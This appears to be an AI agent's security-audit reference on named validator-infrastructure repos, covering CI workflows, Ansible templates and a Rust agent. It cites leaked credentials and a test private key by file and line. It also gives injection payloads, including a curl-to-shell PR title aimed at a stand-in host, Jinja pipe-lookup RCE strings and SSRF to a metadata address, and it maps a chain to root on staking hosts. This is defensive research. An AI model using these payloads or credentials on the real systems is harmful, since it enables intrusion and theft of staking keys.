# Infra / CI-CD / Ansible / Validator-Infra Repo Audits

Session detail from the pointgroup-labs multi-repo hunt (mv-manager, sv-manager,
validator-info, incentivix, svt-agent, + sibling repos). Target class: **ops
repos, not app repos** — Ansible roles with Jinja templates, GitHub Actions
workflows, Python upload scripts, Rust agents, Solana/Stellar validator infra.

The physics differ from the serverless-JS and Solidity classes in the parent
SKILL.md: there is usually **no HTTP surface to probe**, the "attacker" is a PR
author, a forked repo, an inventory file, or an on-chain message — and the
impact is RCE on a validator host that holds staking keys.

---

## 0. Budget discipline (this class eats tool calls FAST)

A 5-repo fan-out with per-file reads will exhaust a 50-call budget before the
report exists. What actually worked:

- **Write the findings skeleton to disk on call ~3-5** (the user's mandated
  column headers as an empty table), then append per-repo as you go. This run
  hit the iteration ceiling AND then 504'd on the closing summary — the report
  never landed. The parent skill's "write incrementally from call ~5" rule was
  recorded under Solidity; it applies harder here because there are 5x more
  repos to enumerate.
- **Batch independent reads aggressively.** `find` + a combined multi-pattern
  `grep -rInE` across ALL repos in one call beats per-repo calls. One
  well-built regex with a false-positive filter (see §1) replaces ~15 calls.
- **Read workflows wholesale** (`cat -n` per file in a loop over
  `.github/workflows/*`) rather than grepping then re-reading — they are short
  and the trigger block matters as much as the `run:` block.
- Reserve the last ~8 calls for the report write + summary. Do not start a new
  repo's deep read inside the last 10 calls.

---

## 1. Secret grep: the DeFi false-positive trap

`token` in a DeFi/crypto repo is an **ERC-20/SPL token address**, not a
credential. A naive sweep of
`(api_key|secret|token|password|private_key)\s*[:=]\s*["'][A-Za-z0-9_.\-]{12,}["']`
returned 80 matches across DefiLlama-Adapters / dimension-adapters — **all**
`token: '0x...'` contract addresses. Zero real secrets.

Filter before reporting:

```bash
# exclude address-shaped values and docs
grep -rInE '<pattern>' . --exclude-dir=.git \
  | grep -viE '0x[0-9a-fA-F]{8,}|example|placeholder|your[_-]|xxx|\.md:'
```

What DID survive as real findings in this run:

- `svt-agent/src/constants.rs:43-46` — InfluxDB endpoint, user `v_user`, and a
  **literal password `thepassword`** hardcoded as `NOTIFY_INFLUX_PASS`.
- `sv-manager/inventory_example/group_vars/all.yml:77-79` —
  `telegraf_password: thepassword` + `telegraf_urls: http://95.216.207.40:8086`
  (plaintext HTTP).
- `sv-manager/inventory_example/group_vars/testnet_validators.yaml:15` —
  `solana_metrics_url` embeds `p=c4fa841aa918bf8274e3e2a44d77568d9861b3ea`
  (looks like a real write token, committed in an *example* inventory).
- `svt-agent/src/messenger/encryption.rs:182-184` — a **base58 Solana secret
  key in a `#[test]`** (`Keypair::from_base58_string("2gnHrTqnjf86...")`).
  Test keypairs are the most-missed leak class in this genre: they are real
  key material, they compile, and nobody greps `#[cfg(test)]`.

Also check: `.gitignore` quality per repo (mv-manager's is exemplary —
`group_vars/vault.yml`, `*.vault`, `**/*.pem`; sv-manager's is good;
validator-info's is **empty**, incentivix's has no secret patterns), and
`git log --all -S '<substring>'` for removed-but-recoverable secrets.

---

## 2. GitHub Actions script-injection sweep — the trigger-vs-interpolation test

The single most important discriminator: **does the untrusted expression land
directly in a `run:` block, or is it passed through `env:` and referenced as
`$VAR`?**

```bash
# find every untrusted-input interpolation, with 6 lines of context
grep -rn -B6 'github.event' --include='*.yml' --include='*.yaml' . | grep -v '/.git/'
```

Then classify each hit:

| Pattern | Verdict |
|---|---|
| `run: echo "${{ github.event.pull_request.title }}"` | **INJECTION** — `$(...)`, backticks, `${IFS}` all execute |
| `env: TITLE: ${{ github.event.pull_request.title }}` then `run: [[ "$TITLE" =~ ... ]]` | **SAFE** — env indirection, no re-expansion by the shell |
| `run: gh pr merge "$PR_URL"` with `env: PR_URL: ${{ github.event.pull_request.html_url }}` | SAFE (quoted var) |
| `ref: ${{ github.event.pull_request.head.ref }}` on a `push:`-triggered workflow | **DEAD EXPRESSION** — `github.event.pull_request` is null on push; not exploitable, but a latent bug if the trigger is ever widened |

Real examples from this run:

- `alula/.github/workflows/conventional-commits.yml:21,36` and
  `alula-liquidator/.github/workflows/conventional-commits.yml:16,31` —
  `TITLE: ${{ github.event.pull_request.title }}` → consumed as `"$TITLE"` in a
  `[[ =~ ]]`. **SAFE.** Both also set `permissions: {}`. Textbook-correct.
- `fogo-locker/.github/workflows/generate-idl.yml:17-18` —
  `ref: ${{ github.event.pull_request.head.ref }}` +
  `repository: ${{ github.event.pull_request.head.repo.full_name }}` inside
  `actions/checkout`, on a workflow whose only triggers are `push: main` and
  `workflow_dispatch`. Both expressions evaluate to empty → checkout defaults
  to the pushed ref. **Not currently exploitable** (no `pull_request` /
  `pull_request_target` trigger), but it is a loaded gun: adding a PR trigger
  turns it into "checkout attacker's fork with `contents: write` +
  `pull-requests: write`". Report as latent, not critical.
- `fogo-stake-pool/.github/workflows/dependabot-auto-merge.yml` — has
  `contents: write` + `pull-requests: write` + `GH_TOKEN`, but the job is
  `if: false` and the login check is commented out. **Disabled.** Note it and
  move on; do not report as live.

**Always check the trigger block FIRST.** A `run:` interpolation is only
reachable if the event that populates `github.event.*` can be influenced by a
non-maintainer. `workflow_dispatch` inputs are maintainer-only by default
(unless the repo allows forked dispatch).

**`pull_request_target` + `actions/checkout` of PR code + secrets in `env`** is
the critical combo. Grep for it explicitly:

```bash
grep -rn -A3 'pull_request_target\|workflow_run' --include='*.yml' . | grep -v '/.git/'
```

None of the pointgroup repos used `pull_request_target` — but
`validator-info/.github/workflows/check.yaml` runs on **`pull_request`** (which
is fork-safe for secrets) and still executes PR-controlled code (see §3).

---

## 3. PR-triggered workflows that install PR-controlled dependencies = RCE

This is the highest-value finding class in the CI/CD genre and it needs no
secret and no `pull_request_target`:

`validator-info/.github/workflows/check.yaml:19`
```yaml
- run: pip install -r scripts/requirements.txt
```
on `on: pull_request`. And `validator-info/scripts/requirements.txt:1` is:
```
git+https://github.com/monad-developers/staking-sdk-cli.git@main
```

A PR that edits `scripts/requirements.txt` to point at an attacker repo (or
flips `@main` to an attacker commit/branch) gets **arbitrary code execution in
the CI runner** on the next PR run. No secrets required for the RCE itself;
`MAINNET_RPC_URL` (line 22) is *not* exposed to forked PRs by GitHub's default,
so the blast radius is the runner + cache, not the secret. Still HIGH.

**Rule:** for every PR-triggered workflow, check whether any install step
consumes a file the PR can modify (`requirements.txt`, `package.json`,
`pnpm-lock.yaml`, `Cargo.toml`, `Makefile`, `scripts/*`). `actions/checkout`
on `pull_request` checks out the **merge ref**, which includes PR edits to
those files.

**SSRF sibling:** `validator-info/scripts/validate.py:66`
`requests.get(logo_url, timeout=10, stream=True)` where `logo_url` comes from
the PR-supplied validator JSON (`data.get("logo")`, line 130). A PR can point
`logo` at `http://169.254.169.254/...` or an internal host and the CI runner
fetches it. Only `https://` prefix + `image/*` content-type are checked
(lines 61-72) — no IP-range or redirect guard. Classic SSRF-guard gap (same
family as the parent skill's SSRF finding class, different host).

**Upload path trace (what the user explicitly asked):**
`generate_validators_json.py` only `json.load`s files and re-dumps them — no
`eval`, no `exec`, no shell interpolation, no template rendering. `validate.py`
likewise only parses. The JSON is consumed as data. **No template/code
injection in the Python upload path** — the injection surface is the CI
workflow (§3) and the SSRF, not the script. Say so explicitly; a "no finding
here" with the trace shown is worth as much as a finding.

---

## 4. Ansible / Jinja — inventory-controlled vars reaching `shell:`

The pattern to hunt: a variable that originates in **inventory / host_vars /
group_vars** (i.e. operator-supplied, or in svt-agent's case
**on-chain-message-supplied**) flowing into a `shell:`/`command:` module or a
`*.sh.j2` template without `| quote`.

```bash
grep -rn -A4 -E '^\s*(command|shell|raw|script):' <repo> \
  --include='*.yml' --include='*.yaml' | grep -E '\{\{'
```

Real hits:

- `sv-manager/roles/solana_validator_bootstrap/tasks/validator_info.yaml:36-48`
  — the standout. A `set_fact` builds `shell_cmd` by string-concatenating
  `{{ validator_description }}`, `{{ validator_name }}`,
  `{{ keybase_username }}`, `{{ validator_homepage }}` into a
  `solana validator-info publish ... -d "..."` command, then line 48 runs
  `shell: "{{ shell_cmd }}"`. Any of those vars containing `"; rm -rf ~ #`
  executes. `validator_name` defaults to `{{ inventory_hostname }}` and
  `validator_description` defaults to a fixed string, so today it needs a
  malicious inventory — but the *shape* is unquoted concatenation into a shell
  string, which is the bug. Note also this task file is **commented out of
  `main.yaml:41-45`** (`# - name: Set validator info`) — latent, not live.
  Report as LATENT with the exact reason.
- `sv-manager/roles/solana_validator_bootstrap/tasks/validator_info.yaml:3`
  `shell: solana-keygen pubkey {{ secrets_path }}/validator-keypair.json` —
  unquoted path var into `shell:`. Use `command:` (no shell) or `| quote`.
- Same file lines 52, 62, 73, 82 (`solana-keygen new ... --outfile {{ secrets_path }}/...`,
  `solana airdrop`, `solana create-vote-account`) — same class.
- `sv-manager/roles/solana_validator_bootstrap/tasks/configure_validator.yaml:3`,
  `cluster_environment.yaml:3` — same.
- `sv-manager/roles/configure_ubuntu/tasks/swap.yaml:36,51,69` —
  `fallocate -l {{ swap_file_size_gb }}G {{ mount_base_path }}/swap/swapfile`.
- `mv-manager/roles/validator/tasks/main.yml:118,138` —
  `export KEYSTORE_PASSWORD="{{ vault_keystore_password }}"` inside a `shell:`
  block. **Quoted**, so not injectable, but the keystore password transits a
  shell command line (visible in `ps`). Note it as hardening, not a vuln —
  and note the file already sets `no_log: true`, which suppresses Ansible's
  log but NOT the process table.
- `mv-manager/roles/validator/tasks/main.yml:271-288` — `shell:` running
  `python staking-cli/main.py add-validator --secp-privkey "{{ effective_secp_key }}"`.
  Private key on a command line again.

**Jinja template side:** check `*.sh.j2` / `*.env.j2` / `*.service.j2` for
`{{ var }}` landing inside a shell string. In mv-manager the templates are
mostly safe (`secrets.env.j2:1` is single-quoted; `sudoers-monad.j2` uses
`{{ monad_user }}` in a sudoers spec where injection would need a crafted
username). `staking-config.toml.j2:11` writes
`funded_address_private_key = "{{ vault_funded_wallet_private_key }}"` to a
`0600` file — that's the intended design, but note the file is a **private key
at rest on disk**, and `backup.sh.j2:17` tars `staking-sdk-cli/config.toml`
into a backup that is then `aws s3 cp`'d (line 29) when
`backup_remote_enabled` — **a private key uploaded to S3**. Check whether the
backup is encrypted: `backup-keys.sh.j2` encrypts the *key* tarball with a
  prompt passphrase, but `backup.sh.j2` uploads the *config* tarball
**unencrypted**. That asymmetry is the finding.

---

## 5. Rust agent → on-chain message → RCE chain (svt-agent)

The most interesting chain in the run. Trace it end to end:

1. `src/listener.rs:70-82` — subscribes to Solana `logsSubscribe` filtered on
   the channel PDA, base64-decodes `Program data:` and deserializes Anchor
   events. **Anyone who can emit a log from the messenger program feeds this.**
2. `src/agent.rs:272-289` — `NewMessageEvent` → `convert_message_to_task`.
3. `src/utils/converter.rs:10-48` — decrypts with the channel CEK, parses JSON,
   pulls `task` (→ `name`), `args`, `secret`, `action`. **No validation of
   `name`.**
4. `src/task_runner.rs:323-363` (`build_cmd`) — builds:
   ```
   ansible-playbook --inventory=/etc/sv_manager/<cluster>_host
     --extra-vars={json of task.args}
     ./playbooks/{task.name}.yaml
   ```
   Two attacker-controlled sinks:
   - **`task.name` → path traversal.** `./playbooks/{}.yaml` with
     `name = "../../etc/cron.d/x"` or an absolute-ish escape. No sanitisation,
     no allowlist of playbook names.
   - **`task.args` → `--extra-vars` JSON.** `parse_args` (converter.rs:50-63)
     splits on whitespace then `=`, so arbitrary key/value pairs become
     Ansible extra-vars — which then flow into exactly the unquoted `shell:`
     templates of §4. **This is the join between the two halves of the chain.**
     ⚠️ **CORRECTION (later session, executed proof):** an earlier version of
     this reference said "`json!(task.args)` is also safe (serde_json escapes
     properly) … do not claim shell RCE". **That was wrong.** `serde_json`
     only guarantees well-formed JSON — `{{ }}` survives JSON encoding
     untouched. `ansible-playbook` renders extra-vars through **Jinja2 before
     `/bin/sh -c`**, so `{{ lookup('pipe','id -un > /tmp/pwn; echo x') }}`
     executes. Verified by execution on two real task files with real
     ansible-core (rendered `cmd` + proof file captured). Harness recipe and
     the general rule: `anchor-unchecked-accountinfo-auth` →
     `references/daemon-side-sinks-and-config-leaks.md` §2b.
     **Lesson: walk the chain to the terminal consumer.** "No shell in the
     argv path" is not the end of the analysis when the argv target is itself
     an interpreter or templating engine.
5. `src/task_runner.rs:302-304` (`build_image_name`) —
   `format!("{}:{}", ANSIBLE_IMAGE, task.version())` where `version()` reads
   `task.args["pb-version"]` (task_runner.rs:52-54). **Attacker-controlled
   Docker image tag** → the agent pulls and runs
   `ghcr.io/mfactory-lab/sv-manager:<attacker-string>` as root.
6. `src/task_runner.rs:274-281` — the task container runs with
   `network_mode: "host"`, `volumes_from([CONTAINER_NAME])`, and the agent
   container itself mounts **`/var/run/docker.sock`** (install.sh:81) and
   `$HOME/.ssh` (install.sh:83) and the agent **keypair** (install.sh:84).
   Docker-socket access = root on the host.
7. `src/monitor.rs:44-61` — Dozzle is started with
   `DOZZLE_BASE=/{task.secret}` on port 8888, and `task.secret` defaults to
   `""` (converter.rs:28-31, task_runner.rs:474). **Empty secret ⇒
   `DOZZLE_BASE=/` ⇒ unauthenticated Dozzle** exposing all container logs
   (which contain the Ansible output, i.e. key material) on a host-network
   port.

**Auth gate:** `agent.rs:361-381` requires `ChannelMembershipStatus::Authorized`
before it will load tasks, and `agent.rs:87-96` requires a minimum SOL balance.
So the chain is gated on channel membership — but membership is granted by
`authorize_member.rs`, and `state.rs:120-122` makes the **channel creator OR a
hardcoded `ADMIN_AUTHORITY`** a super-admin who can authorize anyone. So the
real question for a report is "who holds the admin key
`AuthxkATW25YDWX4kyDLh5qFMV1VhxKtRC9FBHh2JwZR`" — mark deployment-dependent
claims UNTESTED.

**Also note** `sol-messenger/programs/messenger/src/state.rs:128-130` —
`is_permissionless()` makes `can_add_member` / `can_authorize_member` return
true for **any** member. A channel created with the `Permissionless` flag
(0b010) lets any joined member authorize arbitrary new members. Combined with
the above, that is the membership-control weakness that opens the RCE chain.
Worth its own finding.

---

## 6. Report shape this user asks for

The brief specified a per-finding schema. Honour it exactly, one block per
finding:

```
VULNERABILITY / ENTRY / CHAIN / IMPACT / POC / EVIDENCE (file:line) /
CONFIDENCE / MITIGATION
```

- **CONFIDENCE** — use VERIFIED (read the line, it is what it is) /
  INFERENCE (depends on a deployment fact: env value, live key holder,
  whether a task file is wired into `main.yaml`) / LATENT (the code is wrong
  but currently unreachable — e.g. commented-out task, dead `github.event`
  expression, `if: false` job). Never collapse LATENT into a live critical.
- **POC** — for injection, give the exact payload string and where it lands.
  For the Ansible class: `validator_description: 'x"; id > /tmp/pwn; echo "'`.
  For the GHA class: a PR title of `$(curl attacker/x|sh)`.
- **CHAIN** — name each hop with its file:line. A finding whose chain crosses
  repo boundaries (on-chain message → Rust agent → Ansible template → host
  shell) is the one worth leading with.
- Always include a **"examined and NOT vulnerable"** section (the Python
  upload path, the correctly-scoped `permissions: {}` workflows, the
  env-indirection-safe `$TITLE` regex checks). This user hunts for ONE
  critical chain; proving the negatives is what makes the positive credible.

---

## 7. Quick per-repo checklist for this class

1. `find <repo> -type f -not -path '*/.git/*'` — size it first.
2. Secret sweep with the DeFi false-positive filter (§1). Include
   `#[cfg(test)]` blocks and `*_example` / `inventory_example` dirs.
3. `cat -n` every `.github/workflows/*` — read the trigger block before the
   `run:` block.
4. `grep -rn -B6 'github.event'` + classify per §2.
5. For PR-triggered workflows: which install steps consume PR-editable files?
6. `grep -rn -A4 -E '^\s*(command|shell|raw|script):' | grep '{{'` across all
   Ansible repos (§4).
7. Grep `*.j2` for `{{ var }}` inside shell strings / `.env` files.
8. For any agent/daemon: trace the untrusted-input entry point to the exec
   sink (§5) — entry → parse → validate? → exec.
9. Check `.gitignore` per repo; `git log --all -S` for removed secrets.
10. Check for hardcoded creds in `constants.rs` / `defaults/main.yml` /
    `*_example` files — the "example" and "default" files are where ops teams
    paste real values and forget.
